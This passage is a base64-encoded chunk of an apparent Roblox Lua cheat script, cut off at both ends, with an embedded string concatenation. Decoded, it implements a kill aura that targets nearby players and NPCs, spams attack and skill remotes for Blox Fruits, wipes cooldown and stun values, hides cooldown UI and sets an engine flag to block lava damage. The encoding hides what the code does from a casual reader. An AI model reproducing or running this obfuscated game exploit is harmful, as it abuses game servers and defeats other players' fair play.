CAgICAgZm9yIF8sIHRyYWNrIGluIHBhaXJzKGh1bWFub2lkOkdldFBsYXlpbmdBbmltYXRpb25UcmFja3MoKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgdHJhY2suTmFtZTpsb3dlcigpOmZpbmQoImF0dGFjayIpIG9yIHRyYWNrLk5hbWU6bG93ZXIoKTpmaW5kKCJzbGFzaCIpIG9yIHRyYWNrLk5hbWU6bG93ZXIoKTpmaW5kKCJzd2luZyIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyYWNrOlN0b3AoKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAtLSBTcGFtIE0xIFJlbW90ZXMgZm9yIEJsb3ggRnJ1aXRzIChOdWNsZWFyIEZhc3QgQXR0YWNrKQogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICBsb2NhbCBSZXBsaWNhdGVkU3RvcmFnZSA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKQogICAgICAgICAgICAgICAgICAgIGxvY2FsIHJlbW90ZXMgPSBSZXBsaWNhdGVkU3RvcmFnZTpGaW5kRmlyc3RDaGlsZCgiUmVtb3RlcyIpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYgcmVtb3RlcyBhbmQgcmVtb3RlczpGaW5kRmlyc3RDaGlsZCgiVmFsaWRhdG9yIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICByZW1vdGVzLlZhbGlkYXRvcjpGaXJlU2VydmVyKG1hdGguZmxvb3IodGljaygpICogMTAwMCkpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYgdG9vbDpGaW5kRmlyc3RDaGlsZCgiUmVtb3RlRXZlbnQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHRvb2wuUmVtb3RlRXZlbnQ6RmlyZVNlcnZlcigiQXR0YWNrIikKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICB0b29sOkFjdGl2YXRlKCkKICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAogICAgZW5kCgogICAgLS0gREFNQUdFIEZJWCBMT09QIChWYWxpZGF0b3IgU3BhbSBmb3IgR2hvc3QgSGl0cykKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIENvbmZpZy5Jc1J1bm5pbmcgZG8KICAgICAgICAgICAgaWYgKENvbmZpZy5SZWFjaCBvciBDb25maWcuSGl0Ym94RXhwYW5kZXIpIGFuZCBVc2VySW5wdXRTZXJ2aWNlOklzTW91c2VCdXR0b25QcmVzc2VkKEVudW0uVXNlcklucHV0VHlwZS5Nb3VzZUJ1dHRvbjEpIHRoZW4KICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICBsb2NhbCBSZXBsaWNhdGVkU3RvcmFnZSA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKQogICAgICAgICAgICAgICAgICAgIGlmIFJlcGxpY2F0ZWRTdG9yYWdlOkZpbmRGaXJzdENoaWxkKCJSZW1vdGVzIikgYW5kIFJlcGxpY2F0ZWRTdG9yYWdlLlJlbW90ZXM6RmluZEZpcnN0Q2hpbGQoIlZhbGlkYXRvciIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgUmVwbGljYXRlZFN0b3JhZ2UuUmVtb3Rlcy5WYWxpZGF0b3I6RmlyZVNlcnZlcihtYXRoLmZsb29yKHRpY2soKSAqIDEwMDApKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICBlbmQKICAgIGVuZCkKCiAgICBsb2NhbCBmdW5jdGlvbiBFcXVpcFNlbGVjdGVkV2VhcG9uKCkKICAgICAgICBpZiBub3QgcGxheWVyLkNoYXJhY3RlciBvciBub3QgcGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSB0aGVuIHJldHVybiBlbmQKICAgICAgICBsb2NhbCBodW1hbm9pZCA9IHBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQKICAgICAgICBsb2NhbCBiYWNrcGFjayA9IHBsYXllcjpGaW5kRmlyc3RDaGlsZCgiQmFja3BhY2siKQogICAgICAgIAogICAgICAgIGlmIENvbmZpZy5TZWxlY3RlZFdlYXBvbiB0aGVuCiAgICAgICAgICAgIGxvY2FsIHRvb2xJbkhhbmQgPSBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKENvbmZpZy5TZWxlY3RlZFdlYXBvbikKICAgICAgICAgICAgaWYgbm90IHRvb2xJbkhhbmQgYW5kIGJhY2twYWNrIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIHRvb2wgPSBiYWNrcGFjazpGaW5kRmlyc3RDaGlsZChDb25maWcuU2VsZWN0ZWRXZWFwb24pCiAgICAgICAgICAgICAgICBpZiB0b29sIHRoZW4KICAgICAgICAgICAgICAgICAgICBodW1hbm9pZDpFcXVpcFRvb2wodG9vbCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAoKICAgIC0tIERFRElDQVRFRCBLSUxMIEFVUkEgTE9PUCAoTlVDTEVBUiBTUEFNKQogICAgbG9jYWwgbGFzdENvb2xkb3duU2NhbiA9IDAKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIENvbmZpZy5Jc1J1bm5pbmcgZG8KICAgICAgICAgICAgLS0gMS4gTm8gQ29vbGRvd24gTG9naWMgKEFnZ3Jlc3NpdmUgJiBPcHRpbWl6ZWQpCiAgICAgICAgICAgIGlmIENvbmZpZy5Ob0Nvb2xkb3duIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIGN1cnJlbnRUaW1lID0gdGljaygpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC0tIFNjYW4gZXZlcnkgMC4xIHNlY29uZHMgZm9yIGJldHRlciByZXNwb25zaXZlbmVzcwogICAgICAgICAgICAgICAgaWYgY3VycmVudFRpbWUgLSBsYXN0Q29vbGRvd25TY2FuID4gMC4xIHRoZW4KICAgICAgICAgICAgICAgICAgICBsYXN0Q29vbGRvd25TY2FuID0gY3VycmVudFRpbWUKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgYmFja3BhY2sgPSBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoIkJhY2twYWNrIikKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsb2NhbCBmdW5jdGlvbiB3aXBlQ29vbGRvd25zKGNvbnRhaW5lcikKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IGNvbnRhaW5lciB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHYgaW4gcGFpcnMoY29udGFpbmVyOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB2OklzQSgiVmFsdWVCYXNlIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHZOYW1lID0gdi5OYW1lOmxvd2VyKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB2TmFtZTpmaW5kKCJjb29sZG93biIpIG9yIHZOYW1lOmZpbmQoImNkIikgb3Igdk5hbWU6ZmluZCgic2tpbGwiKSBvciB2TmFtZTpmaW5kKCJ0aW1lciIpIG9yIHZOYW1lOmZpbmQoImFiaWxpdHkiKSBvciB2TmFtZTpmaW5kKCJzdHVuIikgb3Igdk5hbWU6ZmluZCgiYnVzeSIpIG9yIHZOYW1lOmZpbmQoInVzaW5nIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdjpJc0EoIlN0cmluZ1ZhbHVlIikgdGhlbiB2LlZhbHVlID0gIiIgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYgdjpJc0EoIkJvb2xWYWx1ZSIpIHRoZW4gdi5WYWx1ZSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHYuVmFsdWUgPSAwIGVuZCAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICB3aXBlQ29vbGRvd25zKGNoYXJhY3RlcikKICAgICAgICAgICAgICAgICAgICB3aXBlQ29vbGRvd25zKGJhY2twYWNrKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIC0tIEhhbmRsZSBBdHRyaWJ1dGVzIG1vcmUgYWdncmVzc2l2ZWx5CiAgICAgICAgICAgICAgICAgICAgaWYgY2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIGF0dHIgaW4gcGFpcnMoeyJTdHVuIiwgIkJ1c3kiLCAiQ29vbGRvd24iLCAiQWJpbGl0eUNvb2xkb3duIiwgIlNraWxsQ29vbGRvd24iLCAiTGFzdFVzZSIsICJOZXh0VXNlIiwgIlVzaW5nIiwgIkNhc3RpbmciLCAiQXR0YWNraW5nIn0pIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpIGNoYXJhY3RlcjpTZXRBdHRyaWJ1dGUoYXR0ciwgMCkgZW5kKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKSBjaGFyYWN0ZXI6U2V0QXR0cmlidXRlKGF0dHIsIGZhbHNlKSBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmIGJhY2twYWNrIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHRvb2wgaW4gcGFpcnMoYmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRvb2w6SXNBKCJUb29sIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBfLCBhdHRyIGluIHBhaXJzKHsiQ29vbGRvd24iLCAiU2tpbGxDb29sZG93biIsICJBYmlsaXR5Q29vbGRvd24iLCAiTGFzdFVzZSIsICJOZXh0VXNlIn0pIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkgdG9vbDpTZXRBdHRyaWJ1dGUoYXR0ciwgMCkgZW5kKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIC0tIFVJIENvb2xkb3duIEhpZGluZwogICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgcGxheWVyR3VpID0gcGxheWVyOkZpbmRGaXJzdENoaWxkKCJQbGF5ZXJHdWkiKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBwbGF5ZXJHdWkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHYgaW4gcGFpcnMocGxheWVyR3VpOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHY6SXNBKCJGcmFtZSIpIG9yIHY6SXNBKCJJbWFnZUxhYmVsIikgb3IgdjpJc0EoIlRleHRMYWJlbCIpKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHZOYW1lID0gdi5OYW1lOmxvd2VyKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdk5hbWU6ZmluZCgiY29vbGRvd24iKSBvciB2TmFtZTpmaW5kKCJjZCIpIG9yIHZOYW1lOmZpbmQoInRpbWVyIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0gU2tpcCBjaGVhdCBHVUkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCAodk5hbWU6ZmluZCgiY3liZXIiKSBvciB2TmFtZTpmaW5kKCJkZXN5bmMiKSBvciB2TmFtZTpmaW5kKCJlc3AiKSkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHYuVmlzaWJsZSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgLS0gMi4gRm9yY2UgQXR0YWNrICYgU2tpbGwgU3BhbSAoQWdncmVzc2l2ZSBOdWNsZWFyIE1vZGUpCiAgICAgICAgICAgIGlmIENvbmZpZy5Ob0Nvb2xkb3duIGFuZCBwbGF5ZXIuQ2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIHRvb2wgPSBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiVG9vbCIpCiAgICAgICAgICAgICAgICBpZiB0b29sIHRoZW4KICAgICAgICAgICAgICAgICAgICAtLSBGb3JjZSBhY3RpdmF0ZSBhbmQgZmlyZSBhdHRhY2sgZXZlbnRzCiAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICB0b29sOkFjdGl2YXRlKCkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgdG9vbDpGaW5kRmlyc3RDaGlsZCgiUmVtb3RlRXZlbnQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgaSA9IDEsIDMgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b29sLlJlbW90ZUV2ZW50OkZpcmVTZXJ2ZXIoIkF0dGFjayIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIC0tIFNwYW0gY29tbW9uIHNraWxsIHJlbW90ZXMgKEJsb3ggRnJ1aXRzIC8gUlBHIHN0eWxlcykKICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHJlbW90ZXMgPSBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIik6RmluZEZpcnN0Q2hpbGQoIlJlbW90ZXMiKSBvciBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgY29tbUYgPSByZW1vdGVzOkZpbmRGaXJzdENoaWxkKCJDb21tRl8iKQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgaWYgY29tbUYgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgc2tpbGxzID0geyJaIiwgIlgiLCAiQyIsICJWIiwgIkYifQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIGtleSBpbiBpcGFpcnMoc2tpbGxzKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21tRjpJbnZva2VTZXJ2ZXIoIlNraWxsIiwga2V5LCB0cnVlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21tRjpJbnZva2VTZXJ2ZXIoIlNraWxsIiwga2V5LCBmYWxzZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgLS0gMy4gS2lsbCBBdXJhIExvZ2ljCiAgICAgICAgICAgIGlmIENvbmZpZy5LaWxsQXVyYSBhbmQgcGxheWVyLkNoYXJhY3RlciBhbmQgcGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIG15Um9vdCA9IHBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydAogICAgICAgICAgICAgICAgLS0gQXV0byBFcXVpcCBXZWFwb24KICAgICAgICAgICAgICAgIEVxdWlwU2VsZWN0ZWRXZWFwb24oKQogICAgICAgICAgICAgICAgaWYgbm90IHBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJUb29sIikgYW5kIHBsYXllcjpGaW5kRmlyc3RDaGlsZCgiQmFja3BhY2siKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdG9vbFRvRXF1aXAgPSBuaWwKICAgICAgICAgICAgICAgICAgICBmb3IgXywgdCBpbiBwYWlycyhwbGF5ZXIuQmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgdDpJc0EoIlRvb2wiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBuID0gdC5OYW1lOmxvd2VyKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG46ZmluZCgic3dvcmQiKSBvciBuOmZpbmQoImJsYWRlIikgb3IgbjpmaW5kKCJrYXRhbmEiKSBvciBuOmZpbmQoInNhYmVyIikgb3IgbjpmaW5kKCJjdXRsYXNzIikgb3IgbjpmaW5kKCJjZGsiKSBvciBuOmZpbmQoInlydSIpIG9yIG46ZmluZCgidHJpZGVudCIpIG9yIG46ZmluZCgibWVsZWUiKSBvciBuOmZpbmQoImNvbWJhdCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b29sVG9FcXVpcCA9IHQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIG5vdCB0b29sVG9FcXVpcCB0aGVuIHRvb2xUb0VxdWlwID0gcGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiVG9vbCIpIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIHRvb2xUb0VxdWlwIGFuZCBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIHRoZW4gcGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZDpFcXVpcFRvb2wodG9vbFRvRXF1aXApIGVuZAogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0ID0gbmlsCiAgICAgICAgICAgICAgICBsb2NhbCBtaW5EaXN0ID0gQ29uZmlnLkF1cmFSYW5nZQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAtLSBUYXJnZXQgU2VsZWN0aW9uCiAgICAgICAgICAgICAgICBpZiBDb25maWcuRWFzeUxvY2sgYW5kIENvbmZpZy5UYXJnZXROYW1lIH49ICJOb25lIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgbG9ja2VkUGxyID0gUGxheWVyczpGaW5kRmlyc3RDaGlsZChDb25maWcuVGFyZ2V0TmFtZSkKICAgICAgICAgICAgICAgICAgICBpZiBsb2NrZWRQbHIgYW5kIGxvY2tlZFBsci5DaGFyYWN0ZXIgYW5kIGxvY2tlZFBsci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikgYW5kIGxvY2tlZFBsci5DaGFyYWN0ZXIuSHVtYW5vaWQuSGVhbHRoID4gMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHRhcmdldCA9IGxvY2tlZFBsci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGlmIG5vdCB0YXJnZXQgdGhlbgogICAgICAgICAgICAgICAgICAgIC0tIFNjYW4gUGxheWVycwogICAgICAgICAgICAgICAgICAgIGZvciBfLCBwIGluIHBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiBwIH49IHBsYXllciBhbmQgcC5DaGFyYWN0" .. "ZXIgYW5kIHAuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgYW5kIHAuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIGFuZCBwLkNoYXJhY3Rlci5IdW1hbm9pZC5IZWFsdGggPiAwIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGlzRW5lbXkgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBDb25maWcuVGVhbUNoZWNrIGFuZCBwLlRlYW0gYW5kIHBsYXllci5UZWFtIGFuZCBwLlRlYW0gPT0gcGxheWVyLlRlYW0gdGhlbiBpc0VuZW15ID0gZmFsc2UgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGlzRW5lbXkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGRpc3QgPSAobXlSb290LlBvc2l0aW9uIC0gcC5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5Qb3NpdGlvbikuTWFnbml0dWRlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZGlzdCA8IG1pbkRpc3QgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtaW5EaXN0ID0gZGlzdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXJnZXQgPSBwLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIC0tIFNjYW4gTlBDcwogICAgICAgICAgICAgICAgICAgIGxvY2FsIGZ1bmN0aW9uIHNjYW4oZm9sZGVyKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgZm9sZGVyIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBmb3IgXywgdiBpbiBwYWlycyhmb2xkZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHY6SXNBKCJNb2RlbCIpIGFuZCB2IH49IHBsYXllci5DaGFyYWN0ZXIgYW5kIHY6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSBhbmQgdjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSBhbmQgdi5IdW1hbm9pZC5IZWFsdGggPiAwIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgUGxheWVyczpHZXRQbGF5ZXJGcm9tQ2hhcmFjdGVyKHYpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgZGlzdCA9IChteVJvb3QuUG9zaXRpb24gLSB2Lkh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24pLk1hZ25pdHVkZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBkaXN0IDwgbWluRGlzdCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtaW5EaXN0ID0gZGlzdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFyZ2V0ID0gdgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBzY2FuKHdvcmtzcGFjZSkKICAgICAgICAgICAgICAgICAgICBzY2FuKHdvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZCgiRW5lbWllcyIpKQogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgLS0gQXR0YWNrIEV4ZWN1dGlvbgogICAgICAgICAgICAgICAgaWYgdGFyZ2V0IGFuZCB0YXJnZXQ6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0Um9vdCA9IHRhcmdldC5IdW1hbm9pZFJvb3RQYXJ0CiAgICAgICAgICAgICAgICAgICAgLS0gQWdncmVzc2l2ZSBGYXN0IEF0dGFjayAoU3BhbSBNMSkKICAgICAgICAgICAgICAgICAgICBmb3IgaSA9IDEsIDE1IGRvCiAgICAgICAgICAgICAgICAgICAgICAgIEF0dGFja0Z1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAtLSBIaXRib3ggRXh0ZW5kZXIgZm9yIEF1cmEKICAgICAgICAgICAgICAgICAgICBpZiBmaXJldG91Y2hpbnRlcmVzdCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KG15Um9vdCwgdGFyZ2V0Um9vdCwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3QobXlSb290LCB0YXJnZXRSb290LCAxKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICB0YXNrLndhaXQoMC4wMSkgLS0gSGlnaCBGcmVxdWVuY3kKICAgICAgICBlbmQKICAgIGVuZCkKICAgIAogICAgLS0gQU5USSBMQVZBIC8gREFNQUdFIEJMT0NLIExPR0lDCiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCB3YXNFbmFibGVkID0gZmFsc2UKICAgICAgICB3aGlsZSBDb25maWcuSXNSdW5uaW5nIGRvCiAgICAgICAgICAgIGlmIENvbmZpZy5BbnRpTGF2YSB0aGVuCiAgICAgICAgICAgICAgICBpZiBub3Qgd2FzRW5hYmxlZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgd2FzRW5hYmxlZCA9IHRydWUKICAgICAgICAgICAgICAgICAgICAtLSBGRmxhZyBNZXRob2QgKFVzZXIgUmVxdWVzdCkKICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHNldGZmbGFnIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNldGZmbGFnKCJERkludFRvdWNoU2VuZGVyTWF4QmFuZHdpZHRoQnBzU2NhbGluZyIsICItMSIpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAg